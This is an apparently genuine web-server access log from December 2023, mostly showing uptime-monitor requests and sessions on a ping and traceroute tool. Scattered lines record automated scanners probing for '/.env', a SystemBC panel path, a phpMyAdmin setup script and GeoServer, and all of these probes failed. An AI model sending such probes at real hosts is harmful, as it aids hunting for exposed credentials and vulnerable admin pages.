65.49.20.67 - - [18/Dec/2023:02:48:39 +0000] "GET / HTTP/1.1" 404 19 "-" "-" 3287 "-" "-" 0ms
65.49.20.67 - - [18/Dec/2023:02:49:13 +0000] "GET /favicon.ico HTTP/1.1" 301 17 "-" "-" 3288 "web-to-websecure@internal" "-" 0ms
159.203.109.206 - - [18/Dec/2023:02:49:23 +0000] "GET / HTTP/2.0" 200 334 "-" "-" 3289 "www@docker" "http://172.18.0.9:80" 0ms
167.71.120.76 - - [18/Dec/2023:02:49:37 +0000] "GET / HTTP/2.0" 200 334 "-" "-" 3290 "www@docker" "http://172.18.0.9:80" 1ms
65.49.20.67 - - [18/Dec/2023:02:49:45 +0000] "GET /geoserver/web/ HTTP/1.1" 301 17 "-" "-" 3291 "web-to-websecure@internal" "-" 0ms
159.203.109.206 - - [18/Dec/2023:02:50:23 +0000] "GET / HTTP/2.0" 200 334 "-" "-" 3292 "www@docker" "http://172.18.0.9:80" 1ms
167.71.120.76 - - [18/Dec/2023:02:50:37 +0000] "GET / HTTP/2.0" 200 334 "-" "-" 3293 "www@docker" "http://172.18.0.9:80" 0ms
159.203.109.206 - - [18/Dec/2023:02:51:23 +0000] "GET / HTTP/2.0" 200 334 "-" "-" 3294 "www@docker" "http://172.18.0.9:80" 0ms
167.71.120.76 - - [18/Dec/2023:02:51:37 +0000] "GET / HTTP/2.0" 200 334 "-" "-" 3295 "www@docker" "http://172.18.0.9:80" 1ms
159.203.109.206 - - [18/Dec/2023:02:52:23 +0000] "GET / HTTP/2.0" 200 334 "-" "-" 3296 "www@docker" "http://172.18.0.9:80" 1ms
173.48.140.140 - - [18/Dec/2023:02:52:27 +0000] "GET /trace/ HTTP/2.0" 200 6032 "-" "-" 3297 "livetrace@docker" "http://172.18.0.3:80" 7ms
173.48.140.140 - - [18/Dec/2023:02:52:27 +0000] "GET /trace/styles.css?version=0.8 HTTP/2.0" 304 0 "-" "-" 3298 "livetrace@docker" "http://172.18.0.3:80" 1ms
167.71.120.76 - - [18/Dec/2023:02:52:37 +0000] "GET / HTTP/2.0" 200 334 "-" "-" 3299 "www@docker" "http://172.18.0.9:80" 1ms
159.203.109.206 - - [18/Dec/2023:02:53:23 +0000] "GET / HTTP/2.0" 200 334 "-" "-" 3300 "www@docker" "http://172.18.0.9:80" 0ms
167.71.120.76 - - [18/Dec/2023:02:53:37 +0000] "GET / HTTP/2.0" 200 334 "-" "-" 3301 "www@docker" "http://172.18.0.9:80" 0ms
159.203.109.206 - - [18/Dec/2023:02:54:23 +0000] "GET / HTTP/2.0" 200 334 "-" "-" 3302 "www@docker" "http://172.18.0.9:80" 0ms
167.71.120.76 - - [18/Dec/2023:02:54:37 +0000] "GET / HTTP/2.0" 200 334 "-" "-" 3303 "www@docker" "http://172.18.0.9:80" 0ms
159.203.109.206 - - [18/Dec/2023:02:55:23 +0000] "GET / HTTP/2.0" 200 334 "-" "-" 3304 "www@docker" "http://172.18.0.9:80" 0ms
167.71.120.76 - - [18/Dec/2023:02:55:37 +0000] "GET / HTTP/2.0" 200 334 "-" "-" 3305 "www@docker" "http://172.18.0.9:80" 0ms
146.70.78.39 - - [18/Dec/2023:02:55:58 +0000] "GET /.env HTTP/1.1" 301 17 "-" "-" 3306 "web-to-websecure@internal" "-" 0ms
146.70.78.39 - - [18/Dec/2023:02:55:59 +0000] "POST / HTTP/1.1" 308 18 "-" "-" 3307 "web-to-websecure@internal" "-" 0ms
146.70.78.39 - - [18/Dec/2023:02:56:00 +0000] "GET /.env HTTP/1.1" 404 19 "-" "-" 3308 "-" "-" 0ms
146.70.78.39 - - [18/Dec/2023:02:56:01 +0000] "POST / HTTP/1.1" 404 19 "-" "-" 3309 "-" "-" 0ms
159.203.109.206 - - [18/Dec/2023:02:56:23 +0000] "GET / HTTP/2.0" 200 334 "-" "-" 3310 "www@docker" "http://172.18.0.9:80" 25ms
167.71.120.76 - - [18/Dec/2023:02:56:37 +0000] "GET / HTTP/2.0" 200 334 "-" "-" 3311 "www@docker" "http://172.18.0.9:80" 16ms
198.235.24.93 - - [18/Dec/2023:02:56:53 +0000] "GET / HTTP/1.1" 404 19 "-" "-" 3312 "-" "-" 0ms
159.203.109.206 - - [18/Dec/2023:02:57:23 +0000] "GET / HTTP/2.0" 200 334 "-" "-" 3313 "www@docker" "http://172.18.0.9:80" 0ms
167.71.120.76 - - [18/Dec/2023:02:57:37 +0000] "GET / HTTP/2.0" 200 334 "-" "-" 3314 "www@docker" "http://172.18.0.9:80" 1ms
159.203.109.206 - - [18/Dec/2023:02:58:23 +0000] "GET / HTTP/2.0" 200 334 "-" "-" 3315 "www@docker" "http://172.18.0.9:80" 0ms
167.71.120.76 - - [18/Dec/2023:02:58:37 +0000] "GET / HTTP/2.0" 200 334 "-" "-" 3316 "www@docker" "http://172.18.0.9:80" 1ms
159.203.109.206 - - [18/Dec/2023:02:59:23 +0000] "GET / HTTP/2.0" 200 334 "-" "-" 3317 "www@docker" "http://172.18.0.9:80" 0ms
167.71.120.76 - - [18/Dec/2023:02:59:37 +0000] "GET / HTTP/2.0" 200 334 "-" "-" 3318 "www@docker" "http://172.18.0.9:80" 1ms
159.203.109.206 - - [18/Dec/2023:03:00:23 +0000] "GET / HTTP/2.0" 200 334 "-" "-" 3319 "www@docker" "http://172.18.0.9:80" 0ms
167.71.120.76 - - [18/Dec/2023:03:00:37 +0000] "GET / HTTP/2.0" 200 334 "-" "-" 3320 "www@docker" "http://172.18.0.9:80" 1ms
159.203.109.206 - - [18/Dec/2023:03:01:23 +0000] "GET / HTTP/2.0" 200 334 "-" "-" 3321 "www@docker" "http://172.18.0.9:80" 1ms
167.71.120.76 - - [18/Dec/2023:03:01:37 +0000] "GET / HTTP/2.0" 200 334 "-" "-" 3322 "www@docker" "http://172.18.0.9:80" 0ms
159.203.109.206 - - [18/Dec/2023:03:02:23 +0000] "GET / HTTP/2.0" 200 334 "-" "-" 3323 "www@docker" "http://172.18.0.9:80" 0ms
167.71.120.76 - - [18/Dec/2023:03:02:37 +0000] "GET / HTTP/2.0" 200 334 "-" "-" 3324 "www@docker" "http://172.18.0.9:80" 0ms
159.203.109.206 - - [18/Dec/2023:03:03:23 +0000] "GET / HTTP/2.0" 200 334 "-" "-" 3325 "www@docker" "http://172.18.0.9:80" 1ms
167.71.120.76 - - [18/Dec/2023:03:03:37 +0000] "GET / HTTP/2.0" 200 334 "-" "-" 3326 "www@docker" "http://172.18.0.9:80" 0ms
185.134.22.149 - - [18/Dec/2023:03:04:21 +0000] "GET / HTTP/1.1" 301 17 "-" "-" 3327 "web-to-websecure@internal" "-" 0ms
185.134.22.149 - - [18/Dec/2023:03:04:22 +0000] "GET / HTTP/1.1" 404 19 "-" "-" 3328 "-" "-" 0ms
159.203.109.206 - - [18/Dec/2023:03:04:23 +0000] "GET / HTTP/2.0" 200 334 "-" "-" 3329 "www@docker" "http://172.18.0.9:80" 0ms
185.134.22.149 - - [18/Dec/2023:03:04:23 +0000] "GET /systembc/password.php HTTP/1.1" 301 17 "-" "-" 3330 "web-to-websecure@internal" "-" 0ms
185.134.22.149 - - [18/Dec/2023:03:04:25 +0000] "GET /systembc/password.php HTTP/1.1" 404 19 "-" "-" 3331 "-" "-" 0ms
185.134.22.149 - - [18/Dec/2023:03:04:26 +0000] "GET /Ep1v HTTP/1.1" 301 17 "-" "-" 3332 "web-to-websecure@internal" "-" 0ms
185.134.22.149 - - [18/Dec/2023:03:04:28 +0000] "GET /Ep1v HTTP/1.1" 404 19 "-" "-" 3333 "-" "-" 0ms
185.134.22.149 - - [18/Dec/2023:03:04:29 +0000] "GET /GWqN HTTP/1.1" 301 17 "-" "-" 3334 "web-to-websecure@internal" "-" 0ms
185.134.22.149 - - [18/Dec/2023:03:04:31 +0000] "GET /GWqN HTTP/1.1" 404 19 "-" "-" 3335 "-" "-" 0ms
167.71.120.76 - - [18/Dec/2023:03:04:37 +0000] "GET / HTTP/2.0" 200 334 "-" "-" 3336 "www@docker" "http://172.18.0.9:80" 0ms
159.203.109.206 - - [18/Dec/2023:03:05:23 +0000] "GET / HTTP/2.0" 200 334 "-" "-" 3337 "www@docker" "http://172.18.0.9:80" 0ms
167.71.120.76 - - [18/Dec/2023:03:05:37 +0000] "GET / HTTP/2.0" 200 334 "-" "-" 3338 "www@docker" "http://172.18.0.9:80" 1ms
159.203.109.206 - - [18/Dec/2023:03:06:23 +0000] "GET / HTTP/2.0" 200 334 "-" "-" 3339 "www@docker" "http://172.18.0.9:80" 0ms
167.71.120.76 - - [18/Dec/2023:03:06:37 +0000] "GET / HTTP/2.0" 200 334 "-" "-" 3340 "www@docker" "http://172.18.0.9:80" 0ms
103.56.61.144 - - [18/Dec/2023:03:07:01 +0000] "GET / HTTP/1.0" 404 19 "-" "-" 3341 "-" "-" 0ms
103.56.61.144 - - [18/Dec/2023:03:07:04 +0000] "GET /favicon.ico HTTP/1.1" 404 19 "-" "-" 3342 "-" "-" 0ms
103.56.61.144 - - [18/Dec/2023:03:07:06 +0000] "GET /robots.txt HTTP/1.1" 404 19 "-" "-" 3343 "-" "-" 0ms
103.56.61.144 - - [18/Dec/2023:03:07:11 +0000] "GET /.well-known/security.txt HTTP/1.1" 404 19 "-" "-" 3344 "-" "-" 0ms
159.203.109.206 - - [18/Dec/2023:03:07:23 +0000] "GET / HTTP/2.0" 200 334 "-" "-" 3345 "www@docker" "http://172.18.0.9:80" 0ms
167.71.120.76 - - [18/Dec/2023:03:07:37 +0000] "GET / HTTP/2.0" 200 334 "-" "-" 3346 "www@docker" "http://172.18.0.9:80" 1ms
159.203.109.206 - - [18/Dec/2023:03:08:23 +0000] "GET / HTTP/2.0" 200 334 "-" "-" 3347 "www@docker" "http://172.18.0.9:80" 0ms
167.71.120.76 - - [18/Dec/2023:03:08:37 +0000] "GET / HTTP/2.0" 200 334 "-" "-" 3348 "www@docker" "http://172.18.0.9:80" 0ms
159.203.109.206 - - [18/Dec/2023:03:09:23 +0000] "GET / HTTP/2.0" 200 334 "-" "-" 3349 "www@docker" "http://172.18.0.9:80" 0ms
167.71.120.76 - - [18/Dec/2023:03:09:37 +0000] "GET / HTTP/2.0" 200 334 "-" "-" 3350 "www@docker" "http://172.18.0.9:80" 0ms
148.153.45.234 - - [18/Dec/2023:03:10:07 +0000] "GET /7wIe HTTP/1.1" 404 19 "-" "-" 3351 "-" "-" 0ms
148.153.45.234 - - [18/Dec/2023:03:10:07 +0000] "GET /uH6j HTTP/1.1" 404 19 "-" "-" 3352 "-" "-" 0ms
148.153.45.234 - - [18/Dec/2023:03:10:09 +0000] "GET /aab8 HTTP/1.1" 404 19 "-" "-" 3353 "-" "-" 0ms
148.153.45.234 - - [18/Dec/2023:03:10:10 +0000] "GET /jquery-3.3.1.slim.min.js HTTP/1.1" 404 19 "-" "-" 3354 "-" "-" 0ms
148.153.45.234 - - [18/Dec/2023:03:10:10 +0000] "GET /aab9 HTTP/1.1" 404 19 "-" "-" 3355 "-" "-" 0ms
148.153.45.234 - - [18/Dec/2023:03:10:10 +0000] "GET /jquery-3.3.2.slim.min.js HTTP/1.1" 404 19 "-" "-" 3356 "-" "-" 0ms
159.203.109.206 - - [18/Dec/2023:03:10:23 +0000] "GET / HTTP/2.0" 200 334 "-" "-" 3357 "www@docker" "http://172.18.0.9:80" 0ms
167.71.120.76 - - [18/Dec/2023:03:10:37 +0000] "GET / HTTP/2.0" 200 334 "-" "-" 3358 "www@docker" "http://172.18.0.9:80" 1ms
91.92.244.94 - - [18/Dec/2023:03:10:45 +0000] "GET /phpMyAdmin/scripts/setup.php HTTP/1.1" 301 17 "-" "-" 3359 "web-to-websecure@internal" "-" 0ms
91.92.244.94 - - [18/Dec/2023:03:10:45 +0000] "POST /phpMyAdmin/scripts/setup.php HTTP/1.1" 308 18 "-" "-" 3360 "web-to-websecure@internal" "-" 0ms
159.203.109.206 - - [18/Dec/2023:03:11:23 +0000] "GET / HTTP/2.0" 200 334 "-" "-" 3361 "www@docker" "http://172.18.0.9:80" 1ms
167.71.120.76 - - [18/Dec/2023:03:11:37 +0000] "GET / HTTP/2.0" 200 334 "-" "-" 3362 "www@docker" "http://172.18.0.9:80" 0ms
173.48.140.140 - - [18/Dec/2023:03:12:10 +0000] "GET /trace/ HTTP/2.0" 200 6051 "-" "-" 3363 "livetrace@docker" "http://172.18.0.3:80" 34ms
173.48.140.140 - - [18/Dec/2023:03:12:10 +0000] "GET /trace/styles.css?version=0.9 HTTP/2.0" 200 1383 "-" "-" 3364 "livetrace@docker" "http://172.18.0.3:80" 0ms
173.48.140.140 - - [18/Dec/2023:03:12:13 +0000] "GET /trace/startping.php?id=k2mmjw9a2 HTTP/2.0" 200 105 "-" "-" 3365 "livetrace@docker" "http://172.18.0.3:80" 5ms
173.48.140.140 - - [18/Dec/2023:03:12:13 +0000] "GET /trace/starttrace.php?id=uz4wm5dkh HTTP/2.0" 200 106 "-" "-" 3366 "livetrace@docker" "http://172.18.0.3:80" 4ms
173.48.140.140 - - [18/Dec/2023:03:12:14 +0000] "GET /trace/polltrace.php?id=uz4wm5dkh HTTP/2.0" 200 84 "-" "-" 3368 "livetrace@docker" "http://172.18.0.3:80" 2ms
173.48.140.140 - - [18/Dec/2023:03:12:14 +0000] "GET /trace/pollping.php?id=k2mmjw9a2 HTTP/2.0" 200 33 "-" "-" 3367 "livetrace@docker" "http://172.18.0.3:80" 3ms
173.48.140.140 - - [18/Dec/2023:03:12:15 +0000] "GET /trace/pollping.php?id=k2mmjw9a2 HTTP/2.0" 200 52 "-" "-" 3369 "livetrace@docker" "http://172.18.0.3:80" 1ms
173.48.140.140 - - [18/Dec/2023:03:12:15 +0000] "GET /trace/polltrace.php?id=uz4wm5dkh HTTP/2.0" 200 84 "-" "-" 3370 "livetrace@docker" "http://172.18.0.3:80" 2ms
173.48.140.140 - - [18/Dec/2023:03:12:16 +0000] "GET /trace/pollping.php?id=k2mmjw9a2 HTTP/2.0" 200 78 "-" "-" 3371 "livetrace@docker" "http://172.18.0.3:80" 1ms
173.48.140.140 - - [18/Dec/2023:03:12:16 +0000] "GET /trace/polltrace.php?id=uz4wm5dkh HTTP/2.0" 200 84 "-" "-" 3372 "livetrace@docker" "http://172.18.0.3:80" 2ms
173.48.140.140 - - [18/Dec/2023:03:12:17 +0000] "GET /trace/pollping.php?id=k2mmjw9a2 HTTP/2.0" 200 104 "-" "-" 3373 "livetrace@docker" "http://172.18.0.3:80" 1ms
173.48.140.140 - - [18/Dec/2023:03:12:17 +0000] "GET /trace/polltrace.php?id=uz4wm5dkh HTTP/2.0" 200 114 "-" "-" 3374 "livetrace@docker" "http://172.18.0.3:80" 2ms
173.48.140.140 - - [18/Dec/2023:03:12:18 +0000] "GET /trace/pollping.php?id=k2mmjw9a2 HTTP/2.0" 200 128 "-" "-" 3375 "livetrace@docker" "http://172.18.0.3:80" 2ms
173.48.140.140 - - [18/Dec/2023:03:12:18 +0000] "GET /trace/polltrace.php?id=uz4wm5dkh HTTP/2.0" 200 114 "-" "-" 3376 "livetrace@docker" "http://172.18.0.3:80" 2ms
173.48.140.140 - - [18/Dec/2023:03:12:19 +0000] "GET /trace/pollping.php?id=k2mmjw9a2 HTTP/2.0" 200 153 "-" "-" 3377 "livetrace@docker" "http://172.18.0.3:80" 1ms
173.48.140.140 - - [18/Dec/2023:03:12:19 +0000] "GET /trace/polltrace.php?id=uz4wm5dkh HTTP/2.0" 200 114 "-" "-" 3378 "livetrace@docker" "http://172.18.0.3:80" 1ms
173.48.140.140 - - [18/Dec/2023:03:12:20 +0000] "GET /trace/polltrace.php?id=uz4wm5dkh HTTP/2.0" 200 116 "-" "-" 3380 "livetrace@docker" "http://172.18.0.3:80" 2ms
173.48.140.140 - - [18/Dec/2023:03:12:20 +0000] "GET /trace/pollping.php?id=k2mmjw9a2 HTTP/2.0" 200 177 "-" "-" 3379 "livetrace@docker" "http://172.18.0.3:80" 3ms
173.48.140.140 - - [18/Dec/2023:03:12:21 +0000] "GET /trace/pollping.php?id=k2mmjw9a2 HTTP/2.0" 200 206 "-" "-" 3381 "livetrace@docker" "http://172.18.0.3:80" 2ms
173.48.140.140 - - [18/Dec/2023:03:12:21 +0000] "GET /trace/polltrace.php?id=uz4wm5dkh HTTP/2.0" 200 116 "-" "-" 3382 "livetrace@docker" "http://172.18.0.3:80" 1ms
173.48.140.140 - - [18/Dec/2023:03:12:21 +0000] "GET /trace/cleanping.php?id=k2mmjw9a2 HTTP/2.0" 200 71 "-" "-" 3383 "livetrace@docker" "http://172.18.0.3:80" 2ms
173.48.140.140 - - [18/Dec/2023:03:12:22 +0000] "GET /trace/polltrace.php?id=uz4wm5dkh HTTP/2.0" 200 116 "-" "-" 3384 "livetrace@docker" "http://172.18.0.3:80" 1ms
173.48.140.140 - - [18/Dec/2023:03:12:23 +0000] "GET /trace/polltrace.php?id=uz4wm5dkh HTTP/2.0" 200 606 "-" "-" 3385 "livetrace@docker" "http://172.18.0.3:80" 1ms
173.48.140.140 - - [18/Dec/2023:03:12:23 +0000] "GET /trace/cleantrace.php?id=uz4wm5dkh HTTP/2.0" 200 72 "-" "-" 3386 "livetrace@docker" "http://172.18.0.3:80" 2ms
159.203.109.206 - - [18/Dec/2023:03:12:23 +0000] "GET / HTTP/2.0" 200 334 "-" "-" 3387 "www@docker" "http://172.18.0.9:80" 0ms
167.71.120.76 - - [18/Dec/2023:03:12:37 +0000] "GET / HTTP/2.0" 200 334 "-" "-" 3388 "www@docker" "http://172.18.0.9:80" 1ms
159.203.109.206 - - [18/Dec/2023:03:13:23 +0000] "GET / HTTP/2.0" 200 334 "-" "-" 3389 "www@docker" "http://172.18.0.9:80" 0ms
167.71.120.76 - - [18/Dec/2023:03:13:37 +0000] "GET / HTTP/2.0" 200 334 "-" "-" 3390 "www@docker" "http://172.18.0.9:80" 0ms
143.110.222.166 - - [18/Dec/2023:03:14:08 +0000] "GET / HTTP/1.1" 301 17 "-" "-" 3391 "web-to-websecure@internal" "-" 0ms
159.203.109.206 - - [18/Dec/2023:03:14:23 +0000] "GET / HTTP/2.0" 200 334 "-" "-" 3392 "www@docker" "http://172.18.0.9:80" 0ms
167.71.120.76 - - [18/Dec/2023:03:14:37 +0000] "GET / HTTP/2.0" 200 334 "-" "-" 3393 "www@docker" "http://172.18.0.9:80" 1ms
159.203.109.206 - - [18/Dec/2023:03:15:23 +0000] "GET / HTTP/2.0" 200 334 "-" "-" 3394 "www@docker" "http://172.18.0.9:80" 1ms
167.71.120.76 - - [18/Dec/2023:03:15:37 +0000] "GET / HTTP/2.0" 200 334 "-" "-" 3395 "www@docker" "http://172.18.0.9:80" 0ms
159.203.109.206 - - [18/Dec/2023:03:16:23 +0000] "GET / HTTP/2.0" 200 334 "-" "-" 3396 "www@docker" "http://172.18.0.9:80" 45ms
173.48.140.140 - - [18/Dec/2023:03:16:29 +0000] "GET /trace/ HTTP/2.0" 200 6049 "-" "-" 3397 "livetrace@docker" "http://172.18.0.3:80" 29ms
173.48.140.140 - - [18/Dec/2023:03:16:29 +0000] "GET /trace/styles.css?version=0.9 HTTP/2.0" 304 0 "-" "-" 3398 "livetrace@docker" "http://172.18.0.3:80" 1ms
173.48.140.140 - - [18/Dec/2023:03:16:35 +0000] "GET /trace/startping.php?id=k0rc439dn HTTP/2.0" 200 105 "-" "-" 3399 "livetrace@docker" "http://172.18.0.3:80" 7ms
173.48.140.140 - - [18/Dec/2023:03:16:35 +0000] "GET /trace/starttrace.php?id=8wyxavvjl HTTP/2.0" 200 106 "-" "-" 3400 "livetrace@docker" "http://172.18.0.3:80" 8ms
173.48.140.140 - - [18/Dec/2023:03:16:36 +0000] "GET /trace/pollping.php?id=k0rc439dn HTTP/2.0" 200 34 "-" "-" 3401 "livetrace@docker" "http://172.18.0.3:80" 2ms
173.48.140.140 - - [18/Dec/2023:03:16:36 +0000] "GET /trace/polltrace.php?id=8wyxavvjl HTTP/2.0" 200 714 "-" "-" 3402 "livetrace@docker" "http://172.18.0.3:80" 1ms
173.48.140.140 - - [18/Dec/2023:03:16:37 +0000] "GET /trace/pollping.php?id=k0rc439dn HTTP/2.0" 200 59 "-" "-" 3403 "livetrace@docker" "http://172.18.0.3:80" 1ms
173.48.140.140 - - [18/Dec/2023:03:16:37 +0000] "GET /trace/polltrace.php?id=8wyxavvjl HTTP/2.0" 200 714 "-" "-" 3404 "livetrace@docker" "http://172.18.0.3:80" 1ms
167.71.120.76 - - [18/Dec/2023:03:16:37 +0000] "GET / HTTP/2.0" 200 334 "-" "-" 3405 "www@docker" "http://172.18.0.9:80" 18ms
173.48.140.140 - - [18/Dec/2023:03:16:38 +0000] "GET /trace/polltrace.php?id=8wyxavvjl HTTP/2.0" 200 714 "-" "-" 3407 "livetrace@docker" "http://172.18.0.3:80" 1ms
173.48.140.140 - - [18/Dec/2023:03:16:38 +0000] "GET /trace/pollping.php?id=k0rc439dn HTTP/2.0" 200 85 "-" "-" 3406 "livetrace@docker" "http://172.18.0.3:80" 2ms
173.48.140.140 - - [18/Dec/2023:03:16:39 +0000] "GET /trace/pollping.php?id=k0rc439dn HTTP/2.0" 200 109 "-" "-" 3408 "livetrace@docker" "http://172.18.0.3:80" 2ms
173.48.140.140 - - [18/Dec/2023:03:16:39 +0000] "GET /trace/polltrace.php?id=8wyxavvjl HTTP/2.0" 200 745 "-" "-" 3409 "livetrace@docker" "http://172.18.0.3:80" 1ms
173.48.140.140 - - [18/Dec/2023:03:16:40 +0000] "GET /trace/pollping.php?id=k0rc439dn HTTP/2.0" 200 134 "-" "-" 3410 "livetrace@docker" "http://172.18.0.3:80" 2ms
173.48.140.140 - - [18/Dec/2023:03:16:40 +0000] "GET /trace/polltrace.php?id=8wyxavvjl HTTP/2.0" 200 745 "-" "-" 3411 "livetrace@docker" "http://172.18.0.3:80" 1ms
173.48.140.140 - - [18/Dec/2023:03:16:41 +0000] "GET /trace/pollping.php?id=k0rc439dn HTTP/2.0" 200 159 "-" "-" 3412 "livetrace@docker" "http://172.18.0.3:80" 1ms
173.48.140.140 - - [18/Dec/2023:03:16:41 +0000] "GET /trace/polltrace.php?id=8wyxavvjl HTTP/2.0" 200 745 "-" "-" 3413 "livetrace@docker" "http://172.18.0.3:80" 1ms
173.48.140.140 - - [18/Dec/2023:03:16:42 +0000] "GET /trace/pollping.php?id=k0rc439dn HTTP/2.0" 200 185 "-" "-" 3414 "livetrace@docker" "http://172.18.0.3:80" 1ms
173.48.140.140 - - [18/Dec/2023:03:16:42 +0000] "GET /trace/polltrace.php?id=8wyxavvjl HTTP/2.0" 200 747 "-" "-" 3415 "livetrace@docker" "http://172.18.0.3:80" 2ms
173.48.140.140 - - [18/Dec/2023:03:16:43 +0000] "GET /trace/pollping.php?id=k0rc439dn HTTP/2.0" 200 207 "-" "-" 3416 "livetrace@docker" "http://172.18.0.3:80" 1ms
173.48.140.140 - - [18/Dec/2023:03:16:43 +0000] "GET /trace/polltrace.php?id=8wyxavvjl HTTP/2.0" 200 747 "-" "-" 3417 "livetrace@docker" "http://172.18.0.3:80" 1ms
173.48.140.140 - - [18/Dec/2023:03:16:43 +0000] "GET /trace/cleanping.php?id=k0rc439dn HTTP/2.0" 200 71 "-" "-" 3418 "livetrace@docker" "http://172.18.0.3:80" 2ms
173.48.140.140 - - [18/Dec/2023:03:16:44 +0000] "GET /trace/polltrace.php?id=8wyxavvjl HTTP/2.0" 200 747 "-" "-" 3419 "livetrace@docker" "http://172.18.0.3:80" 1ms
173.48.140.140 - - [18/Dec/2023:03:16:45 +0000] "GET /trace/polltrace.php?id=8wyxavvjl HTTP/2.0" 200 1015 "-" "-" 3420 "livetrace@docker" "http://172.18.0.3:80" 2ms
173.48.140.140 - - [18/Dec/2023:03:16:45 +0000] "GET /trace/cleantrace.php?id=8wyxavvjl HTTP/2.0" 200 72 "-" "-" 3421 "livetrace@docker" "http://172.18.0.3:80" 2ms
159.203.109.206 - - [18/Dec/2023:03:17:23 +0000] "GET / HTTP/2.0" 200 334 "-" "-" 3422 "www@docker" "http://172.18.0.9:80" 0ms
71.6.232.25 - - [18/Dec/2023:03:17:29 +0000] "GET / HTTP/1.1" 301 17 "-" "-" 3423 "web-to-websecure@internal" "-" 0ms
89.187.178.158 - - [18/Dec/2023:03:17:35 +0000] "GET /trace/ HTTP/2.0" 200 6034 "-" "-" 3424 "livetrace@docker" "http://172.18.0.3:80" 32ms
167.71.120.76 - - [18/Dec/2023:03:17:37 +0000] "GET / HTTP/2.0" 200 334 "-" "-" 3425 "www@docker" "http://172.18.0.9:80" 1ms
89.187.178.158 - - [18/Dec/2023:03:17:39 +0000] "GET /trace/startping.php?id=r8xb9bx7q HTTP/2.0" 200 105 "-" "-" 3426 "livetrace@docker" "http://172.18.0.3:80" 4ms
89.187.178.158 - - [18/Dec/2023:03:17:39 +0000] "GET /trace/starttrace.php?id=lx5k64xd4 HTTP/2.0" 200 106 "-" "-" 3427 "livetrace@docker" "http://172.18.0.3:80" 4ms
89.187.178.158 - - [18/Dec/2023:03:17:40 +0000] "GET /trace/pollping.php?id=r8xb9bx7q HTTP/2.0" 200 31 "-" "-" 3428 "livetrace@docker" "http://172.18.0.3:80" 2ms
89.187.178.158 - - [18/Dec/2023:03:17:40 +0000] "GET /trace/polltrace.php?id=lx5k64xd4 HTTP/2.0" 200 333 "-" "-" 3429 "livetrace@docker" "http://172.18.0.3:80" 3ms
89.187.178.158 - - [18/Dec/2023:03:17:41 +0000] "GET /trace/pollping.php?id=r8xb9bx7q HTTP/2.0" 200 55 "-" "-" 3430 "livetrace@docker" "http://172.18.0.3:80" 1ms
89.187.178.158 - - [18/Dec/2023:03:17:41 +0000] "GET /trace/polltrace.php?id=lx5k64xd4 HTTP/2.0" 200 333 "-" "-" 3431 "livetrace@docker" "http://172.18.0.3:80" 1ms
89.187.178.158 - - [18/Dec/2023:03:17:42 +0000] "GET /trace/pollping.php?id=r8xb9bx7q HTTP/2.0" 200 79 "-" "-" 3432 "livetrace@docker" "http://172.18.0.3:80" 1ms
89.187.178.158 - - [18/Dec/2023:03:17:42 +0000] "GET /trace/polltrace.php?id=lx5k64xd4 HTTP/2.0" 200 333 "-" "-" 3433 "livetrace@docker" "http://172.18.0.3:80" 1ms
89.187.178.158 - - [18/Dec/2023:03:17:43 +0000] "GET /trace/pollping.php?id=r8xb9bx7q HTTP/2.0" 200 102 "-" "-" 3434 "livetrace@docker" "http://172.18.0.3:80" 1ms
89.187.178.158 - - [18/Dec/2023:03:17:43 +0000] "GET /trace/polltrace.php?id=lx5k64xd4 HTTP/2.0" 200 363 "-" "-" 3435 "livetrace@docker" "http://172.18.0.3:80" 1ms
89.187.178.158 - - [18/Dec/2023:03:17:44 +0000] "GET /trace/pollping.php?id=r8xb9bx7q HTTP/2.0" 200 126 "-" "-" 3436 "livetrace@docker" "http://172.18.0.3:80" 2ms
89.187.178.158 - - [18/Dec/2023:03:17:44 +0000] "GET /trace/polltrace.php?id=lx5k64xd4 HTTP/2.0" 200 363 "-" "-" 3437 "livetrace@docker" "http://172.18.0.3:80" 2ms
89.187.178.158 - - [18/Dec/2023:03:17:45 +0000] "GET /trace/pollping.php?id=r8xb9bx7q HTTP/2.0" 200 150 "-" "-" 3438 "livetrace@docker" "http://172.18.0.3:80" 3ms
89.187.178.158 - - [18/Dec/2023:03:17:45 +0000] "GET /trace/polltrace.php?id=lx5k64xd4 HTTP/2.0" 200 363 "-" "-" 3439 "livetrace@docker" "http://172.18.0.3:80" 1ms
89.187.178.158 - - [18/Dec/2023:03:17:46 +0000] "GET /trace/pollping.php?id=r8xb9bx7q HTTP/2.0" 200 174 "-" "-" 3440 "livetrace@docker" "http://172.18.0.3:80" 1ms
89.187.178.158 - - [18/Dec/2023:03:17:46 +0000] "GET /trace/polltrace.php?id=lx5k64xd4 HTTP/2.0" 200 365 "-" "-" 3441 "livetrace@docker" "http://172.18.0.3:80" 1ms
89.187.178.158 - - [18/Dec/2023:03:17:47 +0000] "GET /trace/pollping.php?id=r8xb9bx7q HTTP/2.0" 200 195 "-" "-" 3442 "livetrace@docker" "http://172.18.0.3:80" 1ms
89.187.178.158 - - [18/Dec/2023:03:17:47 +0000] "GET /trace/polltrace.php?id=lx5k64xd4 HTTP/2.0" 200 365 "-" "-" 3443 "livetrace@docker" "http://172.18.0.3:80" 0ms
89.187.178.158 - - [18/Dec/2023:03:17:47 +0000] "GET /trace/cleanping.php?id=r8xb9bx7q HTTP/2.0" 200 71 "-" "-" 3444 "livetrace@docker" "http://172.18.0.3:80" 2ms
89.187.178.158 - - [18/Dec/2023:03:17:48 +0000] "GET /trace/polltrace.php?id=lx5k64xd4 HTTP/2.0" 200 365 "-" "-" 3445 "livetrace@docker" "http://172.18.0.3:80" 2ms
89.187.178.158 - - [18/Dec/2023:03:17:49 +0000] "GET /trace/polltrace.php?id=lx5k64xd4 HTTP/2.0" 200 829 "-" "-" 3446 "livetrace@docker" "http://172.18.0.3:80" 1ms
89.187.178.158 - - [18/Dec/2023:03:17:49 +0000] "GET /trace/cleantrace.php?id=lx5k64xd4 HTTP/2.0" 200 72 "-" "-" 3447 "livetrace@docker" "http://172.18.0.3:80" 2ms
159.203.109.206 - - [18/Dec/2023:03:18:23 +0000] "GET / HTTP/2.0" 200 334 "-" "-" 3448 "www@docker" "http://172.18.0.9:80" 0ms
167.71.120.76 - - [18/Dec/2023:03:18:37 +0000] "GET / HTTP/2.0" 200 334 "-" "-" 3449 "www@docker" "http://172.18.0.9:80" 0ms
159.203.109.206 - - [18/Dec/2023:03:19:23 +0000] "GET / HTTP/2.0" 200 334 "-" "-" 3450 "www@docker" "http://172.18.0.9:80" 1ms
